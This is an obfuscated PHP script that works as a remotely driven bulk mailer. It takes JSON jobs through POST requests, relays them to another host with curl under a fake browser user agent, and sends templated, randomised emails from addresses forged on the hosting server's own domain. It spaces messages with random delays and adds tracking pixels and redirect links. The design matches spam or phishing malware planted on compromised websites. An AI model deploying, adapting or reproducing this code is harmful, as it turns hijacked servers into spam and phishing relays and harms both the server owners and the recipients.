<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($sp10638c) { if ($sp10638c == 'keys') { return array_keys($this->_keys); } } public function Import($sp10638c, $sp42614f) { if (is_array($sp42614f)) { $this->values[$sp10638c] = array(); foreach ($sp42614f as $spf674ce) { if (!empty($spf674ce['key'])) { $this->values[$sp10638c][$spf674ce['key']] = $spf674ce['value']; } else { $this->values[$sp10638c][] = $spf674ce['value']; } } } else { $this->Assign($sp10638c, $sp42614f); } } public function Assign($sp10638c, $spbe386c) { $this->values[$sp10638c] = $spbe386c; } public function Parse($spcaabeb) { $spb848c3 = ''; $spee33a5 = 0; while (true) { $spffaea4 = strpos($spcaabeb, '{', $spee33a5); if ($spffaea4 === false) { $spb848c3 .= substr($spcaabeb, $spee33a5); break; } $spb848c3 .= substr($spcaabeb, $spee33a5, $spffaea4 - $spee33a5); $spee33a5 = $spffaea4 + 1; $spaccd28 = ''; $sp1c8e21 = '{'; $speb8b76 = array(); $sp90ab73 = false; $spe8c3ea = false; $sp06fa0f = 'var'; while ($spee33a5 < strlen($spcaabeb)) { $sp5c7817 = substr($spcaabeb, $spee33a5, 1); $sp1c8e21 .= $sp5c7817; if ($sp5c7817 == ',' || $sp5c7817 == '>' || $sp5c7817 == '|') { if ($sp06fa0f == 'alias') { $sp90ab73 = $spaccd28; } elseif ($sp06fa0f == 'mod') { $spe8c3ea = $spaccd28; } else { $speb8b76[] = $spaccd28; } $spaccd28 = ''; if ($sp5c7817 == '>') { $sp06fa0f = 'alias'; } if ($sp5c7817 == '|') { $sp06fa0f = 'mod'; } $spee33a5++; continue; } if ($sp5c7817 == '}') { if ($sp06fa0f == 'alias') { $sp90ab73 = $spaccd28; } elseif ($sp06fa0f == 'mod') { $spe8c3ea = $spaccd28; } else { $speb8b76[] = $spaccd28; } $spee33a5++; break; } $spaccd28 .= $sp5c7817; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp5c7817) == 0) { $spee33a5++; $speb8b76 = array(); break; } $spee33a5++; } if (sizeof($speb8b76) == 0) { $spb848c3 .= $sp1c8e21; continue; } $sp4650b1 = false; $spd97346 = false; if (preg_match('/^\\^/', $speb8b76[0]) > 0) { $speb8b76[0] = substr($speb8b76[0], 1); $sp4650b1 = true; } if (preg_match('/^\\!/', $speb8b76[0]) > 0) { $speb8b76[0] = substr($speb8b76[0], 1); $spd97346 = true; } $sp228c66 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $speb8b76[0], $sp464479) > 0) { $sp228c66 = $sp464479[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $speb8b76[0], $sp464479) > 0) { $sp228c66 = explode('-', $sp464479[1]); } if ($sp228c66 !== false) { $speb8b76[0] = substr($speb8b76[0], 0, strpos($speb8b76[0], '[')); } $this->_keys[$speb8b76[0]] = true; if (empty($this->values[$speb8b76[0]]) && empty($this->fixed[$speb8b76[0]])) { continue; } if ($sp4650b1) { unset($this->fixed[$speb8b76[0]]); } if (isset($this->fixed[$speb8b76[0]])) { $sp55f0a0 = $this->fixed[$speb8b76[0]]; } else { $sp55f0a0 = ''; $sp41e75a = 1; if (sizeof($speb8b76) == 2) { $sp41e75a = $speb8b76[1]; } if (sizeof($speb8b76) == 3) { $sp41e75a = rand($speb8b76[1], $speb8b76[2]); } for ($spc5cb4b = 0; $spc5cb4b < $sp41e75a; $spc5cb4b++) { if (is_array($this->values[$speb8b76[0]])) { if (!is_array($this->used[$speb8b76[0]])) { $this->used[$speb8b76[0]] = array(); } if (count($this->used[$speb8b76[0]]) == count($this->values[$speb8b76[0]])) { $this->used[$speb8b76[0]] = array(); } if ($sp228c66 !== false && is_scalar($sp228c66)) { $sp55f0a0 .= $this->values[$speb8b76[0]][$sp228c66]; $this->used[$sp228c66] = true; } else { $sp4d3f9a = array(); if (is_array($sp228c66)) { $sp28d577 = $sp228c66[0]; $sp53625f = $sp228c66[1]; } else { $sp28d577 = 0; $sp53625f = count($this->values[$speb8b76[0]]) - 1; } for ($sp1b9d3d = $sp28d577; $sp1b9d3d <= $sp53625f; $sp1b9d3d++) { if ($spd97346 && !empty($this->used[$speb8b76[0]][$sp1b9d3d])) { continue; } $sp4d3f9a[] = $sp1b9d3d; } $spf423a4 = $sp4d3f9a[rand(0, count($sp4d3f9a) - 1)]; $this->used[$speb8b76[0]][$spf423a4] = true; $sp55f0a0 .= $this->values[$speb8b76[0]][$spf423a4]; } } else { $sp55f0a0 .= $this->values[$speb8b76[0]]; } } } $sp55f0a0 = $this->Parse($sp55f0a0); if ($spe8c3ea !== false) { for ($spfb28f9 = 0; $spfb28f9 < strlen($spe8c3ea); $spfb28f9++) { switch (substr($spe8c3ea, $spfb28f9, 1)) { case 'b': $sp55f0a0 = base64_encode($sp55f0a0); break; case 'q': $sp55f0a0 = quoted_printable_encode($sp55f0a0); break; default: break; } } } if ($sp4650b1) { $this->fixed[$speb8b76[0]] = $sp55f0a0; } if ($sp90ab73 !== false && $sp90ab73 != '') { $this->fixed[$sp90ab73] = $sp55f0a0; } $spb848c3 .= $sp55f0a0; } return $spb848c3; } } $sp28ed60 = file_get_contents('php://input'); $spfc8fa1 = json_decode($sp28ed60, true); if (empty($spfc8fa1['via_proxy'])) { $spfc8fa1['via_proxy'] = true; $sp7bb539 = curl_init($spfc8fa1['prefix'] . $spfc8fa1['files']['s']); $spbdfacc = json_encode($spfc8fa1); curl_setopt($sp7bb539, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp7bb539, CURLOPT_TIMEOUT, 600); curl_setopt($sp7bb539, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp7bb539, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp7bb539, CURLOPT_REFERER, $spc36ec0); curl_setopt($sp7bb539, CURLOPT_POST, true); curl_setopt($sp7bb539, CURLOPT_POSTFIELDS, $spbdfacc); curl_setopt($sp7bb539, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($spbdfacc))); $spfff5b7 = curl_exec($sp7bb539); echo $spfff5b7; die; } $sp5929c7 = $_SERVER['SERVER_ADDR']; $sp8cb130 = $_SERVER['HTTP_HOST']; $sp8cb130 = preg_replace('/^www\\./', '', $sp8cb130); $spf6d0aa = new Macros(); $spf6d0aa->Assign('server_addr', $sp5929c7); $spf6d0aa->Assign('server_host', $sp8cb130); foreach ($spfc8fa1['macros'] as $sp10638c => $sp42614f) { $spf6d0aa->Import($sp10638c, $sp42614f); } $spdd2880 = preg_replace('/^www\\./i', '', $sp8cb130); $sp880ed5 = $spf6d0aa->Parse('{from_user}@' . $spdd2880); $spf6d0aa->Assign('from_email', $sp880ed5); $spf6d0aa->Assign('prefix', $spfc8fa1['prefix']); $spf6d0aa->Assign('html', $spfc8fa1['letter']['html']); $spee33a5 = 0; $sp7fd563 = 0; $spec22f8 = 0; $spdca4b5 = array(); foreach ($spfc8fa1['rcpt'] as $sp8a180e) { $spf6d0aa->Assign('email', $sp8a180e['email']); $spf6d0aa->Assign('entry', $sp8a180e); $spf6d0aa->Assign('date', date('r')); $spf6d0aa->Assign('redirect', $spfc8fa1['prefix'] . $spfc8fa1['files']['r']); $spf6d0aa->Assign('redirect_with_uri', $spfc8fa1['prefix'] . $spfc8fa1['files']['r'] . '?uri='); $spf6d0aa->Assign('unsubscribe', $spfc8fa1['prefix'] . $spfc8fa1['files']['u'] . '?id=' . $sp8a180e['id']); $spf6d0aa->Assign('delivery', '<img src="' . $spfc8fa1['prefix'] . $spfc8fa1['files']['d'] . '?id=' . $sp8a180e['id'] . '" />'); $spb59ddb = $spf6d0aa->Parse($spfc8fa1['envelope']['header']); $sp5c44ce = $spf6d0aa->Parse($spfc8fa1['envelope']['body']); if (!empty($sp8a180e['name'])) { $sp97b22d = $sp8a180e['name'] . ' <' . $sp8a180e['email'] . '>'; } else { $sp97b22d = $sp8a180e['email']; } $sp9364bd = $spf6d0aa->Parse($spfc8fa1['letter']['subject']); if ($spee33a5 > 0) { sleep(rand(3, 8)); } $sp186bcb = mail($sp97b22d, $sp9364bd, $sp5c44ce, $spb59ddb); $spdca4b5[$sp8a180e['id']] = $sp186bcb; if ($sp186bcb) { $sp7fd563++; } else { $spec22f8++; } $spee33a5++; } echo serialize(array('total' => count($spfc8fa1['rcpt']), 'sent' => $spee33a5, 'success' => $sp7fd563, 'error' => $spec22f8, 'rcpt' => $spdca4b5));